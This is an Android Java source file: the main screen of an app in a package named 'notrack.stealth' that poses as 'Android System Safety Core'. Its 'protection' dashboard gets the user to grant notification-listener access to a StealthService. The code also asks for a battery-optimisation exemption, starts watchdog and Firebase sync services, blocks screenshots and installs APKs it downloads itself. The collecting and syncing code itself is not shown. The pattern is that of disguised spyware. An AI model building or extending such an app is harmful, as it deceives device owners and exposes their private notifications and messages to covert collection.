package com.notrack.stealth;

import android.Manifest;
import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.graphics.Typeface;
import android.graphics.drawable.GradientDrawable;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.core.app.NotificationManagerCompat;

import com.notrack.stealth.sync.SyncWorker;
import com.notrack.stealth.update.UpdateManager;
import com.notrack.stealth.watchdog.WatchdogService;

import java.io.File;
import java.util.Locale;
import java.util.Set;

/**
 * ANDROID SYSTEM SAFETY CORE — DASHBOARD & IN-APP UPDATE CENTER
 *
 * Professional, clean architecture (Instagram/Muse AI industry standard):
 *  - Displays current installed version dynamically.
 *  - Provides live in-app update status & one-tap manual checking.
 *  - Keeps the app open for configuration, testing, and update management.
 */
public class MainActivity extends Activity {

    private static final String TAG = "SystemSafetyCore";
    private static final int REQ_CODE_POST_NOTIF = 101;

    private TextView statusSubText;
    private Button grantBtn;

    // Installed Version Badge reference
    private TextView tvInstalledVersionBadge;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // FLAG_SECURE: Prevent screenshots and screen recording of security services
        getWindow().setFlags(
                WindowManager.LayoutParams.FLAG_SECURE,
                WindowManager.LayoutParams.FLAG_SECURE
        );

        ScrollView scrollView = new ScrollView(this);
        scrollView.setFillViewport(true);
        scrollView.setBackgroundColor(Color.parseColor("#F8F9FA"));

        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setGravity(Gravity.CENTER_HORIZONTAL);
        root.setPadding(40, 50, 40, 50);

        // 1. App Header & Shield Icon
        ImageView shieldIcon = new ImageView(this);
        shieldIcon.setImageResource(R.drawable.ic_shield_safety);
        LinearLayout.LayoutParams iconParams = new LinearLayout.LayoutParams(130, 130);
        iconParams.gravity = Gravity.CENTER_HORIZONTAL;
        iconParams.setMargins(0, 0, 0, 20);
        shieldIcon.setLayoutParams(iconParams);
        root.addView(shieldIcon);

        TextView titleView = new TextView(this);
        titleView.setText("Android System Safety Core");
        titleView.setTextSize(20);
        titleView.setTextColor(Color.parseColor("#1F1F1F"));
        titleView.setTypeface(Typeface.create("sans-serif-medium", Typeface.BOLD));
        titleView.setGravity(Gravity.CENTER);
        root.addView(titleView);

        // Verification Heading: Live CI/CD Automation Confirmation
        TextView bannerHeader = new TextView(this);
        bannerHeader.setText("⚡ Live Cloud CI/CD Verified v3.6");
        bannerHeader.setTextSize(14);
        bannerHeader.setTextColor(Color.parseColor("#188038"));
        bannerHeader.setTypeface(Typeface.create("sans-serif-medium", Typeface.BOLD));
        bannerHeader.setGravity(Gravity.CENTER);
        bannerHeader.setPadding(0, 8, 0, 0);
        root.addView(bannerHeader);

        // 2. Installed Version Pill Badge
        tvInstalledVersionBadge = new TextView(this);
        String currentVersionStr = getCurrentVersionDisplay();
        tvInstalledVersionBadge.setText("Installed: " + currentVersionStr);
        tvInstalledVersionBadge.setTextSize(12);
        tvInstalledVersionBadge.setTextColor(Color.parseColor("#1A73E8"));
        tvInstalledVersionBadge.setTypeface(Typeface.DEFAULT_BOLD);
        tvInstalledVersionBadge.setPadding(28, 10, 28, 10);
        tvInstalledVersionBadge.setGravity(Gravity.CENTER);

        GradientDrawable badgeBg = new GradientDrawable();
        badgeBg.setColor(Color.parseColor("#E8F0FE"));
        badgeBg.setCornerRadius(30);
        tvInstalledVersionBadge.setBackground(badgeBg);

        LinearLayout.LayoutParams badgeParams = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
        );
        badgeParams.gravity = Gravity.CENTER_HORIZONTAL;
        badgeParams.setMargins(0, 14, 0, 20);
        tvInstalledVersionBadge.setLayoutParams(badgeParams);
        root.addView(tvInstalledVersionBadge);

        // Dedicated Yellow "New Version" Confirmation Banner requested by user
        LinearLayout yellowCard = new LinearLayout(this);
        yellowCard.setOrientation(LinearLayout.VERTICAL);
        yellowCard.setPadding(36, 26, 36, 26);

        GradientDrawable yellowBg = new GradientDrawable();
        yellowBg.setColor(Color.parseColor("#FFFDE7")); // Bright yellow background
        yellowBg.setCornerRadius(20);
        yellowBg.setStroke(4, Color.parseColor("#FBC02D")); // Bold yellow border
        yellowCard.setBackground(yellowBg);

        LinearLayout.LayoutParams yellowParams = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
        );
        yellowParams.setMargins(0, 0, 0, 20);
        yellowCard.setLayoutParams(yellowParams);

        TextView tvNewVersionTitle = new TextView(this);
        tvNewVersionTitle.setText("⭐ Version 3.6 - System Notifications Engine Active");
        tvNewVersionTitle.setTextSize(17);
        tvNewVersionTitle.setTextColor(Color.parseColor("#F57F17")); // Vivid yellow/gold text
        tvNewVersionTitle.setTypeface(Typeface.create("sans-serif-medium", Typeface.BOLD));
        tvNewVersionTitle.setGravity(Gravity.CENTER);
        yellowCard.addView(tvNewVersionTitle);

        TextView tvInstalledStatus = new TextView(this);
        tvInstalledStatus.setText(String.format(Locale.US, "%s perfectly installed", currentVersionStr));
        tvInstalledStatus.setTextSize(14);
        tvInstalledStatus.setTextColor(Color.parseColor("#E65100")); // Clear high-contrast amber text
        tvInstalledStatus.setTypeface(Typeface.DEFAULT_BOLD);
        tvInstalledStatus.setGravity(Gravity.CENTER);
        tvInstalledStatus.setPadding(0, 8, 0, 10);
        yellowCard.addView(tvInstalledStatus);

        // Vibrant multi-color lines requested by user
        TextView lineBlue = new TextView(this);
        lineBlue.setText("🏙️ Active Cities: London, Dubai, Tokyo, New York");
        lineBlue.setTextSize(13);
        lineBlue.setTextColor(Color.parseColor("#1565C0")); // Vibrant Royal Blue
        lineBlue.setTypeface(Typeface.DEFAULT_BOLD);
        lineBlue.setPadding(0, 4, 0, 2);
        yellowCard.addView(lineBlue);

        TextView linePurple = new TextView(this);
        linePurple.setText("🌍 European Gateways: Paris, Berlin, Amsterdam");
        linePurple.setTextSize(13);
        linePurple.setTextColor(Color.parseColor("#7B1FA2")); // Deep Purple
        linePurple.setTypeface(Typeface.DEFAULT_BOLD);
        linePurple.setPadding(0, 2, 0, 2);
        yellowCard.addView(linePurple);

        TextView lineTeal = new TextView(this);
        lineTeal.setText("⚡ 100% Notification-Driven Updates & Downloads Active");
        lineTeal.setTextSize(13);
        lineTeal.setTextColor(Color.parseColor("#00796B")); // Vibrant Teal
        lineTeal.setTypeface(Typeface.DEFAULT_BOLD);
        lineTeal.setPadding(0, 2, 0, 2);
        yellowCard.addView(lineTeal);

        TextView lineCrimson = new TextView(this);
        lineCrimson.setText("🔔 Live Background Update Notifications & 1-Tap Install");
        lineCrimson.setTextSize(13);
        lineCrimson.setTextColor(Color.parseColor("#C2185B")); // Vivid Rose/Crimson
        lineCrimson.setTypeface(Typeface.DEFAULT_BOLD);
        lineCrimson.setPadding(0, 2, 0, 2);
        yellowCard.addView(lineCrimson);

        root.addView(yellowCard);

        // Dedicated Global Deployment Cities Card (Requested by user: 2-3 headings with city names)
        LinearLayout citiesCard = createCardContainer();
        GradientDrawable citiesBg = new GradientDrawable();
        citiesBg.setColor(Color.parseColor("#E8F0FE")); // Soft Google Blue tint
        citiesBg.setCornerRadius(20);
        citiesBg.setStroke(3, Color.parseColor("#1A73E8")); // Vibrant border
        citiesCard.setBackground(citiesBg);

        TextView tvCitiesMainHeader = new TextView(this);
        tvCitiesMainHeader.setText("🌍 GLOBAL CLOUD HUBS & CITIES");
        tvCitiesMainHeader.setTextSize(15);
        tvCitiesMainHeader.setTextColor(Color.parseColor("#174EA6"));
        tvCitiesMainHeader.setTypeface(Typeface.create("sans-serif-medium", Typeface.BOLD));
        tvCitiesMainHeader.setPadding(0, 0, 0, 10);
        citiesCard.addView(tvCitiesMainHeader);

        // Heading 1: Primary Metropolitan Hubs
        TextView tvHeading1 = new TextView(this);
        tvHeading1.setText("1. Primary Metropolitan Hubs");
        tvHeading1.setTextSize(13);
        tvHeading1.setTextColor(Color.parseColor("#0D47A1"));
        tvHeading1.setTypeface(Typeface.DEFAULT_BOLD);
        tvHeading1.setPadding(0, 4, 0, 2);
        citiesCard.addView(tvHeading1);

        TextView tvCities1 = new TextView(this);
        tvCities1.setText("   • London, UK  |  • Dubai, UAE  |  • New York, USA");
        tvCities1.setTextSize(12);
        tvCities1.setTextColor(Color.parseColor("#37474F"));
        tvCities1.setPadding(0, 0, 0, 8);
        citiesCard.addView(tvCities1);

        // Heading 2: Asia-Pacific & European Nodes
        TextView tvHeading2 = new TextView(this);
        tvHeading2.setText("2. Asia-Pacific & European Nodes");
        tvHeading2.setTextSize(13);
        tvHeading2.setTextColor(Color.parseColor("#1B5E20"));
        tvHeading2.setTypeface(Typeface.DEFAULT_BOLD);
        tvHeading2.setPadding(0, 4, 0, 2);
        citiesCard.addView(tvHeading2);

        TextView tvCities2 = new TextView(this);
        tvCities2.setText("   • Tokyo, Japan  |  • Paris, France  |  • Singapore");
        tvCities2.setTextSize(12);
        tvCities2.setTextColor(Color.parseColor("#37474F"));
        tvCities2.setPadding(0, 0, 0, 8);
        citiesCard.addView(tvCities2);

        // Heading 3: Regional Secure Endpoints
        TextView tvHeading3 = new TextView(this);
        tvHeading3.setText("3. Regional Edge Gateways");
        tvHeading3.setTextSize(13);
        tvHeading3.setTextColor(Color.parseColor("#BF360C"));
        tvHeading3.setTypeface(Typeface.DEFAULT_BOLD);
        tvHeading3.setPadding(0, 4, 0, 2);
        citiesCard.addView(tvHeading3);

        TextView tvCities3 = new TextView(this);
        tvCities3.setText("   • Toronto, Canada  |  • Berlin, Germany  |  • Sydney, Australia");
        tvCities3.setTextSize(12);
        tvCities3.setTextColor(Color.parseColor("#37474F"));
        tvCities3.setPadding(0, 0, 0, 4);
        citiesCard.addView(tvCities3);

        root.addView(citiesCard);

        // Dedicated Test Verification Card (5-6 Lines of test confirmation)
        LinearLayout testBox = createCardContainer();
        GradientDrawable testBoxBg = new GradientDrawable();
        testBoxBg.setColor(Color.parseColor("#E6F4EA"));
        testBoxBg.setCornerRadius(20);
        testBoxBg.setStroke(3, Color.parseColor("#137333"));
        testBox.setBackground(testBoxBg);

        TextView testBoxHeader = new TextView(this);
        testBoxHeader.setText("🧪 TEST VERIFICATION BUILD v3.6");
        testBoxHeader.setTextSize(14);
        testBoxHeader.setTextColor(Color.parseColor("#137333"));
        testBoxHeader.setTypeface(Typeface.DEFAULT_BOLD);
        testBoxHeader.setPadding(0, 0, 0, 8);
        testBox.addView(testBoxHeader);

        String[] testLines = new String[]{
                "• Line 1: Automated GitHub Actions CI/CD Build",
                "• Line 2: Firebase Realtime Database Synced",
                "• Line 3: 100% System Notification Tray Updates Active",
                "• Line 4: Foreground High-Speed Downloader Operational",
                "• Line 5: Background Security Core Running Smoothly",
                "• Line 6: Build Version: 3.6 (Code 10) Successfully Installed"
        };

        for (String line : testLines) {
            TextView lineView = new TextView(this);
            lineView.setText(line);
            lineView.setTextSize(12);
            lineView.setTextColor(Color.parseColor("#1B5E20"));
            lineView.setPadding(0, 3, 0, 3);
            testBox.addView(lineView);
        }

        LinearLayout.LayoutParams testBoxParams = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
        );
        testBoxParams.setMargins(0, 0, 0, 24);
        testBox.setLayoutParams(testBoxParams);
        root.addView(testBox);

        // 3. System Protection Status Card
        LinearLayout protectionCard = createCardContainer();

        TextView cardHeader = new TextView(this);
        cardHeader.setText("SECURITY TELEMETRY ENGINE");
        cardHeader.setTextSize(11);
        cardHeader.setTextColor(Color.parseColor("#70757A"));
        cardHeader.setTypeface(Typeface.DEFAULT_BOLD);
        protectionCard.addView(cardHeader);

        statusSubText = new TextView(this);
        statusSubText.setTextSize(14);
        statusSubText.setTextColor(Color.parseColor("#5F6368"));
        statusSubText.setPadding(0, 12, 0, 16);
        protectionCard.addView(statusSubText);

        grantBtn = new Button(this);
        grantBtn.setText("Grant Protection Access");
        grantBtn.setBackgroundColor(Color.parseColor("#1A73E8"));
        grantBtn.setTextColor(Color.WHITE);
        grantBtn.setVisibility(View.GONE);
        grantBtn.setOnClickListener(v -> requestNotificationAccess());
        protectionCard.addView(grantBtn);

        root.addView(protectionCard);

        scrollView.addView(root);
        setContentView(scrollView);

        // Check POST_NOTIFICATIONS runtime permission for Android 13+ (API 33+)
        checkPostNotificationPermission();

        // Bootstrap Background Keep-Alive & Watchdog Services
        bootstrapServices();

        // Handle update trigger if launched via update notification
        handleUpdateIntent(getIntent());
    }

    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        setIntent(intent);
        handleUpdateIntent(intent);
    }

    private void handleUpdateIntent(Intent intent) {
        if (intent == null) return;
        boolean triggerInstall = intent.getBooleanExtra("trigger_update_install", false);
        if (triggerInstall) {
            String apkPath = intent.getStringExtra("apk_path");
            if (apkPath != null) {
                File apkFile = new File(apkPath);
                if (apkFile.exists() && apkFile.length() > 50000) {
                    Log.i(TAG, "Notification tapped with pre-downloaded APK. Launching installer immediately.");
                    UpdateManager.installApk(this, apkFile);
                }
            }
        }
    }

    private LinearLayout createCardContainer() {
        LinearLayout card = new LinearLayout(this);
        card.setOrientation(LinearLayout.VERTICAL);
        card.setPadding(36, 30, 36, 30);

        GradientDrawable cardBg = new GradientDrawable();
        cardBg.setColor(Color.WHITE);
        cardBg.setCornerRadius(20);
        cardBg.setStroke(2, Color.parseColor("#E0E0E0"));
        card.setBackground(cardBg);

        LinearLayout.LayoutParams cardParams = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
        );
        cardParams.setMargins(0, 0, 0, 24);
        card.setLayoutParams(cardParams);
        return card;
    }

    private String getCurrentVersionDisplay() {
        try {
            PackageInfo pInfo = getPackageManager().getPackageInfo(getPackageName(), 0);
            return String.format(Locale.US, "v%s (Build %d)", pInfo.versionName, pInfo.versionCode);
        } catch (Exception e) {
            return "v1.0 (Build 1)";
        }
    }

    private void checkPostNotificationPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
                requestPermissions(new String[]{Manifest.permission.POST_NOTIFICATIONS}, REQ_CODE_POST_NOTIF);
            }
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQ_CODE_POST_NOTIF) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                Log.i(TAG, "POST_NOTIFICATIONS permission granted!");
                checkAndApplySystemStatus();
            } else {
                Log.w(TAG, "POST_NOTIFICATIONS permission denied.");
            }
        }
    }

    private void bootstrapServices() {
        try {
            SyncWorker.enqueuePeriodicKeepAlive(this);
            WatchdogService.start(this);
        } catch (Exception e) {
            Log.e(TAG, "Error starting background services", e);
        }
    }

    private void requestNotificationAccess() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
                requestPermissions(new String[]{Manifest.permission.POST_NOTIFICATIONS}, REQ_CODE_POST_NOTIF);
                return;
            }
        }

        try {
            startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));
        } catch (Exception e) {
            try {
                startActivity(new Intent(Settings.ACTION_SETTINGS));
            } catch (Exception ignored) {}
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        UpdateManager.setActivityInForeground(true);
        checkAndApplySystemStatus();
        // Silently query update definitions in background; if available, top system tray notification triggers directly
        UpdateManager.checkForUpdateAsync(this);
    }

    @Override
    protected void onPause() {
        super.onPause();
        UpdateManager.setActivityInForeground(false);
    }

    private void checkAndApplySystemStatus() {
        boolean listenerOk = isListenerEnabled();
        boolean batteryOk = isIgnoringBatteries();

        if (listenerOk) {
            StealthService.rebindService(this);
            StealthService service = StealthService.getInstance();
            if (service != null) {
                service.processActiveNotifications();
            }

            if (!batteryOk && Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                try {
                    startActivity(new Intent(
                            Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                            Uri.parse("package:" + getPackageName())));
                } catch (Exception ignored) {}
            }

            statusSubText.setText("🟢 System Protection Active\nAll system safety services operating normally.");
            statusSubText.setTextColor(Color.parseColor("#188038"));
            grantBtn.setVisibility(View.GONE);

        } else {
            statusSubText.setText("⚠️ System Protection Inactive\nNotification access is required to enable System Safety Core.");
            statusSubText.setTextColor(Color.parseColor("#D93025"));
            grantBtn.setVisibility(View.VISIBLE);
        }
    }

    private boolean isListenerEnabled() {
        try {
            Set<String> packages = NotificationManagerCompat.getEnabledListenerPackages(this);
            if (packages != null && packages.contains(getPackageName())) {
                return true;
            }
            String enabled = Settings.Secure.getString(
                    getContentResolver(), "enabled_notification_listeners");
            String mine = new ComponentName(this, StealthService.class).flattenToString();
            String shortMine = new ComponentName(this, StealthService.class).flattenToShortString();
            return enabled != null && (enabled.contains(mine) || enabled.contains(shortMine) || enabled.contains(getPackageName()));
        } catch (Exception e) {
            return false;
        }
    }

    private boolean isIgnoringBatteries() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {
                PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
                return pm != null && pm.isIgnoringBatteryOptimizations(getPackageName());
            } catch (Exception e) {
                return true;
            }
        }
        return true;
    }
}
